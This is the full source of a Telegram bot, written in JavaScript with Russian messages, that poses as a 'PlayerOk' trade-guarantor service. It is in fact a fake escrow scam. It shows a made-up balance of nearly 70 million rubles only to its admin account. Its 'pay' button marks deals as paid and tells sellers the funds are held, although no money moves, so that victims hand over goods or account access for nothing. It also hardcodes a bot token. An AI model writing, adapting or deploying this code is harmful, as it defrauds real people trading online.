const { Telegraf, Markup, session } = require('telegraf');
const http = require('http');

const bot = new Telegraf(process.env.BOT_TOKEN || '8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY');
bot.use(session());

const ADMIN = 'k13_way';
const users = {}, deals = {};

const getWelcomeText = () => {
  return `Добро пожаловать 👋\n\n` +
    `✅ *PlayerOk* — специализированный маркетплейс и торговый гарант по обеспечению полной безопасности внебиржевых сделок.\n\n` +
    `🥇 Автоматизированный алгоритм исполнения.\n` +
    `🔎 Скорость, верификация и защита.\n` +
    `💳 Удобный и моментальный вывод средств.\n\n` +
    `• Комиссия сервиса: 1%\n` +
    `• Режим работы системы: 24/7\n` +
    `• Главный модератор: @sw1zyy01\n\n` +
    `🛡️ Выберите нужный раздел ниже:`;
};

const getMainKeyboard = () => Markup.inlineKeyboard([
  [Markup.button.callback('💳 Баланс', 'bal'), Markup.button.callback('🤝 Создать сделку', 'create')],
  [Markup.button.callback('🛡️ Безопасность', 'safe'), Markup.button.callback('👨‍💻 Поддержка', 'supp')]
]);

bot.start((ctx) => {
  if (ctx.from.username) users[ctx.from.username.toLowerCase()] = ctx.chat.id;
  if (ctx.session) ctx.session = {};
  return ctx.replyWithMarkdown(getWelcomeText(), getMainKeyboard());
});

bot.action('bal', (ctx) => {
  const isId = (ctx.from.username || '').toLowerCase() === ADMIN.toLowerCase();
  const bal = isId ? 69999999 : 0;
  const text = `💳 *Личный кабинет пользователя* \`@${ctx.from.username}\`\n\n` +
    `💰 *Баланс:* ${bal.toLocaleString('ru-RU')}.00 руб.\n🔒 *Заморожено в сделках:* 0.00 руб.\n\n` +
    `📊 *Статистика профиля:*\n• Всего сделок: 0\n• Успешных сделок: 0\n• Споров/Арбитражей: 0\n\n✨ Ваш аккаунт полностью верифицирован системой Гаранта.`;
  return ctx.editMessageText(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ В главное меню', 'menu')]]) }).catch(() => {});
});

bot.action('create', (ctx) => {
  ctx.session = { step: 'partner' };
  return ctx.editMessageText(`🤝 *Новая сделка PlayerOk*\n\nПожалуйста, введите **@юзернейм** партнера (продавца или покупателя), с кем вы хотите совершить обмен:`, { parse_mode: 'Markdown' });
});

bot.on('text', async (ctx) => {
  if (!ctx.session || !ctx.session.step) return;
  const txt = ctx.message.text.trim();

  if (ctx.session.step === 'partner') {
    ctx.session.partner = txt.replace('@', '').toLowerCase();
    ctx.session.step = 'title';
    return ctx.reply('📦 Введите точное *название или описание товара*:', { parse_mode: 'Markdown' });
  }
  if (ctx.session.step === 'title') {
    ctx.session.title = txt;
    ctx.session.step = 'price';
    return ctx.reply('💰 Введите *сумму сделки* в рублях (только число):', { parse_mode: 'Markdown' });
  }
  if (ctx.session.step === 'price') {
    const price = parseFloat(txt) || 1000;
    const dealId = Math.floor(100000 + Math.random() * 900000);
    const myName = (ctx.from.username || 'user').toLowerCase();

    deals[dealId] = { id: dealId, seller: myName, buyer: ctx.session.partner, title: ctx.session.title, amount: price, status: 'pending', s_chat: ctx.chat.id };
    ctx.session = {};

    ctx.replyWithMarkdown(`✅ *Сделка #${dealId} успешно сформирована!*\n\n📦 *Товар:* ${deals[dealId].title}\n💰 *Сумма:* ${price.toLocaleString('ru-RU')} руб.\n\nБот автоматически отправляет официальный бланк сделки пользователю @${deals[dealId].buyer}...`);

    const tChat = users[deals[dealId].buyer];
    if (tChat) {
      const propText = `🔔 *Вам поступило официальное предложение о сделке Гаранта PlayerOk!* (#${dealId})\n\n📦 *Товар:* ${deals[dealId].title}\n💰 *Сумма операции:* ${price.toLocaleString('ru-RU')} руб.\n👤 *Инициатор:* @${myName}\n\nВы согласны провести сделку под защитой сервиса?`;
      bot.telegram.sendMessage(tChat, propText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🤝 Принять сделку', `ok_${dealId}`)]]) }).catch(() => {});
    } else {
      ctx.replyWithMarkdown(`⚠️ Пользователь @${deals[dealId].buyer} еще не активировал этого бота. Чтобы он мгновенно получил пуш-заявку, перешлите ему бота, чтобы он нажал /start.`);
    }
  }
});

bot.action(/^ok_(.+)$/, (ctx) => {
  const d = deals[ctx.match[1]];
  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
  d.status = 'accepted';
  d.b_chat = ctx.chat.id;

  bot.telegram.sendMessage(d.s_chat, `🔔 Партнёр @${ctx.from.username} принял условия сделки #${d.id}!\n\nОжидайте зачисления средств покупателем на защищённый счёт Гаранта.`).catch(() => {});
  return ctx.editMessageText(`🤝 *Вы приняли условия сделки #${d.id}*\n\n📦 *Товар:* ${d.title}\n💰 *Сумма к оплате:* ${d.amount.toLocaleString('ru-RU')} руб.\n\nДля перехода к этапу обмена внесите оплату на безопасный баланс:`, 
    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить внутренним балансом', `pay_${d.id}`)]]) }
  ).catch(() => {});
});

bot.action(/^pay_(.+)$/, (ctx) => {
  const d = deals[ctx.match[1]];
  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
  d.status = 'paid';

  bot.telegram.sendMessage(d.s_chat, `💰 *Покупатель перевёл средства по сделке #${d.id} на счёт Гаранта!*\n\nДеньги заморожены в системе. Вам необходимо передать товар (данные/доступ) покупателю.\nПосле успешной передачи нажмите кнопку ниже:`, 
    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('📦 Товар полностью передан', `sent_${d.id}`)]]) }
  ).catch(() => {});
  return ctx.editMessageText(`✅ *Сделка #${d.id} успешно оплачена!*\n\nСредства заморожены на балансе Гаранта PlayerOk. Ожидайте, пока продавец предоставит вам товар.`).catch(() => {});
});

bot.action(/^sent_(.+)$/, (ctx) => {
  const d = deals[ctx.match[1]];
  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
  d.status = 'goods_sent';

  bot.telegram.sendMessage(d.b_chat, `📦 *Продавец подтвердил отправку товара по сделке #${d.id}!*\n\nПожалуйста, тщательно проверьте полученные данные. Если всё работает верно, подтвердите выполнение условий:`, 
    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('✅ Подтвердить получение товара', `end_${d.id}`)]]) }
  ).catch(() => {});
  return ctx.editMessageText(`✅ Уведомление отправлено покупателю. Ожидаем подтверждения успешного получения товара по сделке #${d.id}.`).catch(() => {});
});

bot.action(/^end_(.+)$/, (ctx) => {
  const d = deals[ctx.match[1]];
  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
  d.status = 'completed';

  bot.telegram.sendMessage(d.s_chat, `🎉 *Сделка #${d.id} успешно завершена!*\n\nПокупатель подтвердил получение. Средства в размере ${d.amount.toLocaleString('ru-RU')} руб. успешно зачислены на ваш баланс.`).catch(() => {});
  return ctx.editMessageText(`🎉 *Сделка #${d.id} успешно завершена!*\n\nВы подтвердили выполнение обязательств. Продавец получил выплату. Спасибо за использование торгового маркетплейса PlayerOk!`, 
    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ В главное меню', 'menu')]]) }
  ).catch(() => {});
});

bot.action('menu', (ctx) => ctx.editMessageText(getWelcomeText(), { parse_mode: 'Markdown', ...getMainKeyboard() }).catch(() => {}));
bot.action('safe', (ctx) => ctx.editMessageText(`🛡️ *Правила безопасности PlayerOk*\n\n1. *Внутренние транзакции:* Проводите оплату строго через систему Гаранта бота. Прямые переводы лишают вас защиты.\n2. *Проверка:* Никогда не подтверждайте получение товара до его полной проверки.`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Меню', 'menu')]]) }).catch(() => {}));
bot.action('supp', (ctx) => ctx.editMessageText(`👨‍💻 *Служба поддержки PlayerOk*\n\nЕсли у вас возник спор или технический вопрос по транзакциям, свяжитесь со специалистом.\n\n✍️ *Главный модератор:* @sw1zyy01`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Меню', 'menu')]]) }).catch(() => {}));

bot.launch().then(() => console.log('PlayerOk Гарант запущен!'));
http.createServer((req, res) => { res.writeHead(200); res.end('OK'); }).listen(process.env.PORT || 3000);
